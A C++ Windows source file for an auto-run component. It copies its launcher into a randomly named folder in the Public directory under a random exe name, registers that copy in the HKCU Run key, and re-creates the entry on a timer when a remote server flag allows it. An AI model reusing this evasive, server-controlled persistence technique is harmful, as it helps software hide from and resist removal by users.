#include "stdafx.h"
#include "AutoRun.h"
#include <Tlhelp32.h>
#include <shlobj.h>
#pragma comment(lib,"Urlmon.lib")

extern std::wstring gwstrCmdLine;
extern HINSTANCE ghInstance;

CAutoRun::CAutoRun(void)
{
	TSAUTO();
	m_hMutex = NULL;
}

CAutoRun::~CAutoRun(void)
{
	TSAUTO();	
}

BOOL CAutoRun::HandleSingleton()
{
	TSAUTO();
#define APP_DD_MAGIC 0x0904
	LPWSTR lpstrCmdLine = ::GetCommandLineW();
	COPYDATASTRUCT cds = {0};
	cds.dwData = APP_DD_MAGIC;          // function identifier
	cds.cbData =(int) sizeof( WCHAR ) * ((int)wcslen(lpstrCmdLine) + 1) ;  // size of data
	cds.lpData = lpstrCmdLine;     

	UINT iSingleTon = 1;
	if(iSingleTon)
	{
		static TCHAR szMutex[_MAX_PATH] = {0};
		_sntprintf(szMutex, _MAX_PATH, _T("#mutex%s_%s"), AR_WND_MUTEX,_T("1.0"));
		m_hMutex = CreateMutex(NULL, true, szMutex);
		bool bExist = (ERROR_ALREADY_EXISTS == ::GetLastError() || ERROR_ACCESS_DENIED == ::GetLastError());
		if(bExist)
		{
			TSERROR4CXX("startup failed");				//	ATLASSERT(false && "WaitForSingleObject 前");//
			WaitForSingleObject(m_hMutex, INFINITE);//等其它进程的这个窗口建完

			HWND hWnd = ::FindWindow(AR_WND_CALSSNAME, NULL);
			if(hWnd)
			{
				if(!SendMessageTimeout(hWnd, WM_COPYDATA, (WPARAM)0, (LPARAM) (LPVOID) &cds, SMTO_ABORTIFHUNG, 10000, NULL))
				{
					DWORD dwProcessID = 0;
					::GetWindowThreadProcessId(hWnd, &dwProcessID);
					HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
					TerminateProcess(hProcess, (UINT)10000);

					STARTUPINFO si;
					PROCESS_INFORMATION pi;
					ZeroMemory( &si, sizeof(si) );
					si.cb = sizeof(si);					

					ZeroMemory( &pi, sizeof(pi) );
					// Start the child process. 
					CreateProcess( NULL,         // No module name (use command line). 
						(LPTSTR)lpstrCmdLine, // Command line. 
						NULL,                         // Process handle not inheritable. 
						NULL,						  // Thread handle not inheritable. 
						FALSE,						  // Set handle inheritance to FALSE. 
						0,							  // No creation flags. 
						NULL,						  // Use parent's environment block. 
						NULL,						  // Use parent's starting directory. 
						&si,						  // Pointer to STARTUPINFO structure.
						&pi );						  // Pointer to PROCESS_INFORMATION structure.
				}				
			}
			ReleaseMutex(m_hMutex);
			CloseHandle(m_hMutex);		
			return TRUE;
		}
	}	

	if (m_hWnd == NULL)
		Create(HWND_MESSAGE);

	//::SendMessage(m_hWnd, WM_COPYDATA, 0, (LPARAM) (LPVOID) &cds ); //注意Init里处理，不能再发copydata给自己的窗口过程处理
	if(m_hMutex)
		ReleaseMutex(m_hMutex);//使得 WaitForSingleObject 运行下去
	return FALSE;
}

LRESULT CAutoRun::OnCopyData(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM lParam, BOOL& /*bHandled*/)
{
	TSAUTO();
	USES_CONVERSION;
	COPYDATASTRUCT * pcs = (COPYDATASTRUCT *)lParam;
	LPCWSTR pcszCommandLine = (LPCWSTR)pcs->lpData;
	TSDEBUG4CXX("OnCopyData, commandline : "<<pcszCommandLine);	
	if(pcszCommandLine && wcslen(pcszCommandLine) > 0)
	{
		std::wstring wstrFirstArg = L"";
		LPWSTR *szArglist = NULL;   
		int nArgs = 0;   
		szArglist = CommandLineToArgvW(pcszCommandLine, &nArgs);   
		if( NULL != szArglist && nArgs >= 1)   
		{   
			//szArglist就是保存参数的数组   
			//nArgs是数组中参数的个数   
			//数组的第一个元素表示进程的path，也就是szArglist[0]，其他的元素依次是输入参数。   
			wstrFirstArg = szArglist[1];
		}   
		//取得参数后，释放CommandLineToArgvW申请的空间   
		LocalFree(szArglist); 
		TSDEBUG4CXX("OnCopyData, commandline : "<<wstrFirstArg.c_str());
		//std::wstring wstrCommandLine(pcszCommandLine);
		//std::size_t pos = wstrCommandLine.find(L" ");
		//if (pos != std::wstring::npos)
		//{
		//	wstrCommandLine = wstrCommandLine.substr(pos+2);
		//}
		std::size_t posSet = wstrFirstArg.find(L"-ran");
		std::size_t posUnSet = wstrFirstArg.find(L"-unran");
		
		if (0 == posUnSet)
		{
			if (0 != m_uTimerID)
			{
				KillTimer(m_uTimerID);
				m_uTimerID = 0;
				DeleteAutoRun();
				TSDEBUG4CXX("OnCopyData, exit");
				TerminateProcess(::GetCurrentProcess(),0);
			}
		}
		else
		{
			if (0 == m_uTimerID)
			{
				if (!CheckClientCfg() || !GetServerCfg())
				{
					CreateAutoRun(FALSE);
					TSDEBUG4CXX("OnCopyData launch main client");
					return 0;
				}
				TSDEBUG4CXX("OnCopyData start timer");
				m_uTimerID = SetTimer(94,AR_TIMER_INTERVAL);
				return 0;
			}
		}
	}
	return 0;
}

LRESULT CAutoRun::OnExit(UINT /*uMsg*/, WPARAM wParam, LPARAM /*lParam*/, BOOL& /*bHandled*/)
{
	TSAUTO();	
	TerminateProcess(GetCurrentProcess(),0);
	return 0;
}

BOOL CAutoRun::CheckSetBoot()
{
	HKEY hLaunchKey;
	if(ERROR_SUCCESS != ::RegCreateKeyEx(HKEY_CURRENT_USER, AR_CLIENT_HKCU, NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_READ|KEY_WRITE, NULL,&hLaunchKey,NULL))
	{
		m_uTimerFail++;
		TSERROR4CXX("CheckSetBoot fail, RegCreateKeyEx AR_CLIENT_HKCU");
		return FALSE;
	}
	const wchar_t* szSetBoot = L"setboot";
	DWORD dwSetBoot = 0;
	DWORD cbData = sizeof(DWORD);
	DWORD dwRegType = REG_DWORD;
	if (ERROR_SUCCESS ==  ::RegQueryValueEx(hLaunchKey, szSetBoot, NULL, &dwRegType, reinterpret_cast<LPBYTE>(&dwSetBoot), &cbData))
	{
		if (1 == dwSetBoot)
		{
			RegCloseKey(hLaunchKey);
			return TRUE;
		}
	}
	RegCloseKey(hLaunchKey);
	return FALSE;
}

void CAutoRun::OnTimer(UINT_PTR nTimerID)
{
	if (m_uTimerFail > AR_MAX_FAIL)
	{
		TSERROR4CXX("OnTimer fail, create auto run too many fail");
		TerminateProcess(GetCurrentProcess(),0);
	}
	if (!CreateAutoRun(TRUE))
	{
		++m_uTimerFail;
	}
}

BOOL CAutoRun::Init()
{
	m_uTimerFail = 0;
	m_uTimerID = 0;
	m_bUpdated = FALSE;
	HKEY hKey = NULL;
	if(ERROR_SUCCESS != ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, AR_CLIENT_HKLM, 0, KEY_READ, &hKey)) {
		TSERROR4CXX("Init fail, RegOpenKeyEx AR_CLIENT_HKLM");
		return FALSE;
	}
	const wchar_t* value_name = L"Path";
	wchar_t path[MAX_PATH * 2] = {0};
	DWORD cbData = sizeof(path);
	DWORD dwRegType = REG_SZ;
	if (ERROR_SUCCESS != ::RegQueryValueEx(hKey, value_name, NULL, &dwRegType, reinterpret_cast<LPBYTE>(path), &cbData))
	{
		TSERROR4CXX("Init fail, RegQueryValueEx Path");
		::RegCloseKey(hKey);
		return FALSE;
	}
	::RegCloseKey(hKey);
	m_wstrMainPath = path;
	if (!::PathFileExistsW(m_wstrMainPath.c_str()))
	{
		return FALSE;
	}
	std::size_t last = m_wstrMainPath.find_last_of(L"\\");
	if (last == std::wstring::npos)
	{
		return FALSE;
	}
	m_wstrMainDir = m_wstrMainPath.substr(0,last);
	m_wstrMainExeName = m_wstrMainPath.substr(last+1);
	m_wstrLaunchPath = m_wstrMainPath.substr(0,last+1) + AR_LAUNCH_EXE;
	m_wstrLaunchNameWithOutExt = std::wstring(AR_LAUNCH_EXE).substr(0,wcslen(AR_LAUNCH_EXE)- 4);

	LaunchMainClient();
	wchar_t szModulePath[MAX_PATH] = {0};
	if (0 == GetModuleFileName(ghInstance, szModulePath, MAX_PATH))
	{
		return FALSE;
	}
	if (wcsicmp(szModulePath,m_wstrLaunchPath.c_str()) == 0)
	{
		if (HandleSingleton())
		{
			return FALSE;
		}
		std::size_t posUnSet = gwstrCmdLine.find(L"-unran");
		if (0 == posUnSet)
		{
			DeleteAutoRun();
			TSDEBUG4CXX("unran finish");
			return FALSE;
		}

		if (!CheckClientCfg() || !GetServerCfg())
		{
			CreateAutoRun(FALSE);
			TSDEBUG4CXX("launch main client");
			return FALSE;
		}
		TSDEBUG4CXX("start timer");
		m_uTimerID = SetTimer(94,AR_TIMER_INTERVAL);
		return TRUE;
	}
	else
	{
		SHELLEXECUTEINFO sei;
		std::memset(&sei, 0, sizeof(SHELLEXECUTEINFO));
		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.lpFile = m_wstrLaunchPath.c_str();
		sei.lpParameters = L"-ran";
		sei.nShow = SW_NORMAL;
		BOOL bRet = static_cast<int>(ShellExecuteEx(&sei)) > 32;
		TSDEBUG4CXX("launch origin exe");
		return FALSE;
	}
}

BOOL CAutoRun::GetServerCfg()
{
	std::string strFileData;
	if (HttpDownloadString(AR_CLIENT_SERVER,strFileData))
	{
		if (strFileData[0] >= 'a' && strFileData[0] <= 'z')
		{
			return TRUE;
		}
	}
	return FALSE;
}

BOOL CAutoRun::HttpDownloadString(const std::wstring& strUrl, std::string &strFileData)
{
	::CoInitialize(NULL);
	TCHAR szSavePath[MAX_PATH] = {0};
	HRESULT hr = ::URLDownloadToCacheFile(NULL, strUrl.c_str(), szSavePath, sizeof(szSavePath), 0, NULL);
	if (SUCCEEDED(hr))
	{
		HANDLE hFile = CreateFile(szSavePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD dwLen =0;
		dwLen = GetFileSize(hFile, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			char* szBuffer = new char[dwLen+1];
			ZeroMemory(szBuffer, dwLen+1);
			DWORD dwRead = 0;
			ReadFile(hFile, szBuffer, dwLen, &dwRead, NULL);
			char szPrint[100] = {0};
			sprintf(szPrint, "dwRead:%d dwLen:%d", dwRead, dwLen);
			strFileData = szBuffer;
			CloseHandle(hFile);
			delete[] szBuffer;
			DeleteFile(szSavePath);
			::CoUninitialize();
			return TRUE;
		}
	}
	::CoUninitialize();
	return FALSE;
}

BOOL CAutoRun::CheckClientCfg()
{
	HKEY hKey = NULL;
	if(ERROR_SUCCESS != ::RegOpenKeyEx(HKEY_CURRENT_USER, AR_CLIENT_HKCU, 0, KEY_READ, &hKey)) {
		return FALSE;
	}
	const wchar_t* value_name = L"laopen";
	DWORD dwLaunchOpen = 0;
	DWORD cbData = sizeof(DWORD);
	DWORD dwRegType = REG_DWORD;
	if (ERROR_SUCCESS ==  ::RegQueryValueEx(hKey, value_name, NULL, &dwRegType, reinterpret_cast<LPBYTE>(&dwLaunchOpen), &cbData))
	{
		if (1 == dwLaunchOpen)
		{
			::RegCloseKey(hKey);
			return TRUE;
		}
	}
	::RegCloseKey(hKey);
	return FALSE;
}

BOOL CAutoRun::LaunchMainClient()
{
	std::size_t posSet = gwstrCmdLine.find(L"-ran");
	std::size_t posUnSet = gwstrCmdLine.find(L"-unran");
	if (0 == posSet || 0 == posUnSet)
	{
		return FALSE;
	}
	if (CheckProcessExist(m_wstrMainExeName.c_str()))
	{
		return FALSE;
	}

	SHELLEXECUTEINFO sei;
	std::memset(&sei, 0, sizeof(SHELLEXECUTEINFO));
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.lpFile = m_wstrMainPath.c_str();
	sei.lpParameters = gwstrCmdLine.c_str();
	sei.nShow = SW_NORMAL;
	BOOL bRet = static_cast<int>(ShellExecuteEx(&sei)) > 32;
	return bRet;
}

std::wstring CAutoRun::CreateRandomName(UINT ulen,const std::wstring& wstrNotMatch)
{
	wchar_t szRanName[MAX_PATH] = {0};
	while (1)
	{
		ZeroMemory(szRanName, MAX_PATH);
		srand( (unsigned)time( NULL ) );
		for (UINT i = 0; i < ulen; ++i)
		{
			szRanName[i] = 'a' + rand()%26;
		}
		if (wcsstr(szRanName, L"sex") == NULL 
			&& (wstrNotMatch.empty() || wcsicmp(szRanName, wstrNotMatch.c_str()) != 0) )
			break;
	}
	return std::wstring(szRanName);
}

BOOL CAutoRun::DeleteFileRecurse(const std::wstring& wstrPath)
{
	static std::wstring wstrPublic = GetAllUsersPublicPath();
	if (std::wstring::npos == wstrPath.find(wstrPublic))
	{
		return FALSE;
	}
	if (wstrPath.empty() || wcsicmp(wstrPath.c_str(),m_wstrLaunchPath.c_str()) == 0)
	{
		return FALSE;
	}

	if (!::PathFileExistsW(wstrPath.c_str()))
	{
		return FALSE;
	}

	std::size_t last = wstrPath.find_last_of(L"\\");
	if (last != std::wstring::npos)
	{
		std::wstring wstrDir = wstrPath.substr(0,last+1);
		std::wstring wstrSearch = wstrDir + L"*";
		WIN32_FIND_DATA fd;
		HANDLE hFind = INVALID_HANDLE_VALUE;
		TCHAR szSearchPath[MAX_PATH] = {0};
		wcscpy(szSearchPath,wstrSearch.c_str());
		hFind = FindFirstFile(szSearchPath, &fd);
		while (INVALID_HANDLE_VALUE != hFind)
		{
			if (_tcsicmp(fd.cFileName, _T("..")) && _tcsicmp(fd.cFileName, _T(".")) && FILE_ATTRIBUTE_DIRECTORY != fd.dwFileAttributes)
			{
				TCHAR szFileTmp[MAX_PATH] = {0};
				::PathCombine(szFileTmp, wstrDir.c_str(), fd.cFileName);
				DeleteFile(szFileTmp);
			}

			if (FindNextFile(hFind, &fd) == 0)
			{
				break;
			}
		}
		FindClose(hFind);
		RemoveDirectory(wstrDir.c_str());
	}
	return TRUE;
}

void CAutoRun::GetExePathDetailInfo(const std::wstring& wstrPath,std::wstring& wstrDir,std::wstring& wstrDirName,std::wstring& wstrFileNameWithOutExt)
{
	std::size_t last = wstrPath.find_last_of(L"\\");
	if (last != std::wstring::npos)
	{
		wstrDir = wstrPath.substr(0,last);
		std::wstring wstrExeName = wstrPath.substr(last+1);
		last = wstrDir.find_last_of(L"\\");
		if (last != std::wstring::npos)
		{
			wstrDirName = wstrDir.substr(last+1);
		}
		last = wstrExeName.find_last_of(L".");
		if (last != std::wstring::npos)
		{
			wstrFileNameWithOutExt = wstrExeName.substr(0,last);
		}	
	}
}

BOOL CAutoRun::CreateAutoRun(BOOL bNewRun)
{
	if (!CheckSetBoot())
	{
		return TRUE;
	}
	static std::wstring wstrPublic = GetAllUsersPublicPath();
	std::wstring wstrNewFileNameWithOutExt;
	wchar_t szNewLaunchPath[MAX_PATH] = {0};

	HKEY hLaunchKey;
	if(ERROR_SUCCESS != ::RegCreateKeyEx(HKEY_CURRENT_USER, AR_CLIENT_HKCU, NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_READ|KEY_WRITE, NULL,&hLaunchKey,NULL))
	{
		TSERROR4CXX("CreateAutoRun fail, RegCreateKeyEx AR_CLIENT_HKCU");
		return FALSE;
	}
	HKEY hRunKey;
	if(ERROR_SUCCESS != ::RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ|KEY_WRITE, &hRunKey)) 
	{
		TSERROR4CXX("CreateAutoRun fail, RegOpenKeyEx Run");
		::RegCloseKey(hLaunchKey);
		return FALSE;
	}
	wchar_t szLastLaunch[MAX_PATH * 2] = {0};
	DWORD cbLastLaunch = sizeof(szLastLaunch);
	DWORD dwRegTypeLastLaunch = REG_SZ;
	const wchar_t* szLaunchValueName = L"lpath";
	
	std::wstring wstrLastLaunchPath = L"";
	if (ERROR_SUCCESS == ::RegQueryValueEx(hLaunchKey, szLaunchValueName, NULL, &dwRegTypeLastLaunch, reinterpret_cast<LPBYTE>(szLastLaunch), &cbLastLaunch))
	{
		wstrLastLaunchPath = szLastLaunch;
	}
	std::wstring wstrLastDir, wstrLastDirName, wstrFileNameWithOutExt;
	if (!wstrLastLaunchPath.empty())
	{
		GetExePathDetailInfo(wstrLastLaunchPath,wstrLastDir,wstrLastDirName,wstrFileNameWithOutExt);
	}
	if (!wstrFileNameWithOutExt.empty())
	{
		wchar_t szRun[MAX_PATH * 2] = {0};
		DWORD cbRun = sizeof(szLastLaunch);
		DWORD dwRegTypeRun = REG_SZ;
		if (ERROR_SUCCESS == ::RegQueryValueEx(hRunKey, wstrFileNameWithOutExt.c_str(), NULL, &dwRegTypeRun, reinterpret_cast<LPBYTE>(szRun), &cbRun))
		{
			std::wstring wstrRun = szRun;
			wstrRun = GetRealPath(wstrRun);
			if (::PathFileExistsW(wstrRun.c_str()))
			{
				if (wcsicmp(m_wstrLaunchPath.c_str(),wstrRun.c_str()) != 0 && !m_bUpdated)
				{
					m_bUpdated = TRUE;
					UpdateLaunchFile(m_wstrLaunchPath,wstrRun);
				}
				::RegCloseKey(hLaunchKey);
				::RegCloseKey(hRunKey);
				return TRUE;
			}
			else
			{
				::RegDeleteValue(hRunKey, wstrFileNameWithOutExt.c_str());
			}
		}
	}
	DeleteFileRecurse(wstrLastLaunchPath);
	if (bNewRun)
	{
		wchar_t szNewDir[MAX_PATH] = {0};
		while(1)
		{
			std::wstring wstrNewDirName = CreateRandomName(7,wstrLastDirName);
			::PathCombine(szNewDir,wstrPublic.c_str(),wstrNewDirName.c_str());
			if (!::PathFileExists(szNewDir))
			{
				break;
			}
		}

		if (ERROR_SUCCESS != SHCreateDirectoryEx(NULL, szNewDir, NULL))
		{
			TSERROR4CXX("CreateAutoRun fail, SHCreateDirectoryEx");
			::RegCloseKey(hLaunchKey);
			::RegCloseKey(hRunKey);
			return FALSE;
		}

		wstrNewFileNameWithOutExt = CreateRandomName(9,wstrFileNameWithOutExt);
		std::wstring wstrNewExe = wstrNewFileNameWithOutExt+L".exe";

		::PathCombine(szNewLaunchPath,szNewDir,wstrNewExe.c_str());
		CopyFile(m_wstrLaunchPath.c_str(),szNewLaunchPath, FALSE);
		WCHAR szFiles[][MAX_PATH] = {L"Microsoft.VC90.ATL.manifest", L"Microsoft.VC90.CRT.manifest", L"msvcr90.dll",L"msvcp90.dll", L"ATL90.dll"};
		
		wchar_t szSrcDir[MAX_PATH] = {0};
		wcscpy(szSrcDir,m_wstrMainDir.c_str());
		
		UINT uMax = ARRAYSIZE(szFiles);
		UINT uIndex = 0;
		while(uIndex < uMax) 
		{
			wchar_t szSrcPath[MAX_PATH] = {0};
			::PathCombine(szSrcPath,szSrcDir,szFiles[uIndex]);

			wchar_t szDestPath[MAX_PATH] = {0};
			::PathCombine(szDestPath,szNewDir,szFiles[uIndex]);
			CopyFile(szSrcPath,szDestPath, FALSE);
			++uIndex;
		}
	}
	else
	{
		wstrNewFileNameWithOutExt = m_wstrLaunchNameWithOutExt;
		wcscpy(szNewLaunchPath,m_wstrLaunchPath.c_str());
	}
	std::wstring wstrAutoRun = L"\"";
	wstrAutoRun += szNewLaunchPath;
	wstrAutoRun += L"\"";
	wstrAutoRun += L" ";
	wstrAutoRun += AR_COMMANDLINE;
	if (ERROR_SUCCESS != ::RegSetValueEx(hRunKey, wstrNewFileNameWithOutExt.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(wstrAutoRun.c_str()), (wstrAutoRun.length()) * sizeof(wchar_t)))
	{
		TSERROR4CXX("CreateAutoRun fail, RegSetValueEx Run");
		::RegCloseKey(hLaunchKey);
		::RegCloseKey(hRunKey);
		return FALSE;
	}
	if (ERROR_SUCCESS != ::RegSetValueEx(hLaunchKey, szLaunchValueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(szNewLaunchPath), (wcslen(szNewLaunchPath)) * sizeof(wchar_t)))
	{
		::RegDeleteValue(hRunKey, wstrNewFileNameWithOutExt.c_str());
	}
	::RegCloseKey(hLaunchKey);
	::RegCloseKey(hRunKey);
	return TRUE;
}

void CAutoRun::UpdateLaunchFile(const std::wstring& wstrSrcFile,const std::wstring& wstrDestFile)
{
	std::wstring strOldDestFile = wstrDestFile+L".old";
	unsigned __int64 i64SrcTimeStamp = 0,i64DestTimeStamp = 0;
	if (!::PathFileExists(wstrDestFile.c_str()))
	{
		CopyFile(wstrSrcFile.c_str(), wstrDestFile.c_str(), FALSE);
	}
	else
	{
		unsigned __int64 i64SrcVer = GetFileVersion(wstrSrcFile.c_str(), &i64SrcTimeStamp);
		unsigned __int64 i64DestVer = GetFileVersion(wstrDestFile.c_str(), &i64DestTimeStamp);
		if (VerCmp(i64DestVer, i64SrcVer) < 0)
		{
			if (!DeleteFile(wstrDestFile.c_str()))
			{
				::MoveFileEx(wstrDestFile.c_str(), strOldDestFile.c_str(), MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);
			}
			CopyFile(wstrSrcFile.c_str(), wstrDestFile.c_str(), FALSE);
		}

	}
}

BOOL CAutoRun::DeleteAutoRun()
{
	HKEY hLaunchKey;
	if(ERROR_SUCCESS != ::RegCreateKeyEx(HKEY_CURRENT_USER, AR_CLIENT_HKCU, NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_READ|KEY_WRITE, NULL,&hLaunchKey,NULL))
	{
		return FALSE;
	}

	wchar_t szLastLaunch[MAX_PATH * 2] = {0};
	DWORD cbLastLaunch = sizeof(szLastLaunch);
	DWORD dwRegTypeLastLaunch = REG_SZ;
	const wchar_t* szLaunchValueName = L"lpath";
	
	if (ERROR_SUCCESS != ::RegQueryValueEx(hLaunchKey, szLaunchValueName, NULL, &dwRegTypeLastLaunch, reinterpret_cast<LPBYTE>(szLastLaunch), &cbLastLaunch))
	{
		::RegCloseKey(hLaunchKey);
		return TRUE;
	}
	std::wstring wstrLastLaunchPath = szLastLaunch;
	if (wstrLastLaunchPath.empty())
	{
		::RegCloseKey(hLaunchKey);
		return TRUE;
	}
	std::wstring wstrLastDir, wstrLastDirName, wstrFileNameWithOutExt;
	GetExePathDetailInfo(wstrLastLaunchPath,wstrLastDir,wstrLastDirName,wstrFileNameWithOutExt);
	if (wstrFileNameWithOutExt.empty())
	{
		::RegCloseKey(hLaunchKey);
		return FALSE;
	}
	BOOL bDelete = TRUE;
	HKEY hRunKey = NULL;
	if(ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ|KEY_WRITE, &hRunKey)) 
	{
		if (ERROR_SUCCESS != ::RegDeleteValue(hRunKey, wstrFileNameWithOutExt.c_str()))
		{
			bDelete = FALSE;
		}
	}
	DeleteFileRecurse(wstrLastLaunchPath);
	if (bDelete)
	{
		bDelete = (ERROR_SUCCESS ==::RegDeleteValue(hLaunchKey,szLaunchValueName));
	}
	::RegCloseKey(hLaunchKey);
	return bDelete;
}



unsigned __int64 GetFileVersion(const TCHAR* file_path, unsigned __int64 * VerionTimeStamp)
{
	if (FALSE == PathFileExists(file_path))
		return 0;
	unsigned __int64 i64Version = 0;
	VS_FIXEDFILEINFO *FileInfo = NULL;
	void *info = NULL;
	DWORD infosize = ::GetFileVersionInfoSize((TCHAR*)file_path, 0);
	info = malloc(infosize+4);
	if( NULL != info ) 
	{
		UINT   FileInfoSize;   
		if (FALSE != ::GetFileVersionInfo((TCHAR*)file_path,   0,   infosize,   info))
		{
			if (FALSE != ::VerQueryValue(info, _T("\\"), (void **)&FileInfo, &FileInfoSize))
			{
				i64Version = ((unsigned __int64)FileInfo->dwFileVersionMS << 32) | FileInfo->dwFileVersionLS;
				if (VerionTimeStamp)
				{
					WIN32_FILE_ATTRIBUTE_DATA attribute;
					if ( GetFileAttributesEx(file_path, GetFileExInfoStandard,	&attribute ) )
					{
						unsigned __int64 i64CreateTime = ((unsigned __int64)attribute.ftCreationTime.dwHighDateTime << 32) | attribute.ftCreationTime.dwLowDateTime;
						unsigned __int64 i64LastWriteTime = ((unsigned __int64)attribute.ftLastWriteTime.dwHighDateTime << 32) | attribute.ftLastWriteTime.dwLowDateTime;
						*VerionTimeStamp = (i64CreateTime>i64LastWriteTime) ? i64CreateTime : i64LastWriteTime;
					}
				}

			}
		}
		free(info);
	}   
	return i64Version;
}

int VerCmp(unsigned __int64 ver1, unsigned __int64 ver2)
{
	int result = 0;
	unsigned __int64 i64Ver1 = (ver1 >> 32) << 32 | LOWORD(ver1 & 0xffffffff);
	unsigned __int64 i64Ver2 = (ver2 >> 32) << 32 | LOWORD(ver2 & 0xffffffff);
	if ( i64Ver1 > i64Ver2 )
		result = 1;
	else if ( i64Ver1 < i64Ver2 )
		result = -1;

	return result;
}


bool IsVistaOrLatter()
{
	OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
	{
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
		{
		}
	}
	return (osvi.dwMajorVersion >= 6);
}
typedef HRESULT (STDAPICALLTYPE *PSHGetKnownFolderPath)(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken, PWSTR *ppszPath);

std::wstring GetAllUsersPublicPath()
{
	std::wstring wstrPublic = L"";
	if(IsVistaOrLatter()) {
		HMODULE hModule = ::LoadLibraryA("shell32.dll");
		PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
		if(NULL == SHGetKnownFolderPath) {
			return wstrPublic;
		}
		const GUID publicFolderGuid = {0xDFDF76A2, 0xC82A, 0x4D63, {0x90, 0x6A, 0x56, 0x44, 0xAC, 0x45, 0x73, 0x85}};
		wchar_t* szPublicPath = NULL;
		HRESULT hr = SHGetKnownFolderPath(publicFolderGuid, 0, NULL, &szPublicPath);
		if(FAILED(hr)) {
			return wstrPublic;
		}
		wstrPublic = szPublicPath;
		::CoTaskMemFree(szPublicPath);
		FreeLibrary(hModule);
		return wstrPublic;
	}
	else {
		wchar_t tempBuffer[MAX_PATH];
		HRESULT hr = SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, &tempBuffer[0]);
		if(FAILED(hr)) {
			return wstrPublic;
		}
		wstrPublic = tempBuffer;
		return wstrPublic;
	}
}

BOOL CheckProcessExist(std::wstring wstrProcessName, BOOL bQuit)
{
	BOOL bRtn = FALSE;
	do{
		HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
		if(hSnapShot == NULL) {
			break;
		}

		PROCESSENTRY32 stProcessEntry = {0};
		stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hSnapShot,&stProcessEntry);
		do 
		{
			if(wcsicmp(stProcessEntry.szExeFile, wstrProcessName.c_str()) == 0) {
				bRtn = TRUE;
				if (bQuit == TRUE)	// 强制结束
				{
					HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, stProcessEntry.th32ProcessID ); 
					TerminateProcess( hProcess, 0 );
				}
				break;
			}
		} while (Process32Next(hSnapShot,&stProcessEntry));
		CloseHandle(hSnapShot);
	}while(false);

	return bRtn;
}

std::wstring GetRealPath(const std::wstring &wstrPath)
{
	std::wstring wstrRealPath = wstrPath;
	std::size_t begain = wstrRealPath.find_first_of(L"\"");
	if (begain != 0)
	{
		return wstrPath;
	}
	wstrRealPath = wstrPath.substr(1);
	std::size_t end = wstrRealPath.find_first_of(L"\"");
	if (end == std::wstring::npos)
	{
		return wstrPath;
	}
	wstrRealPath = wstrRealPath.substr(0,end);
	return wstrRealPath;
}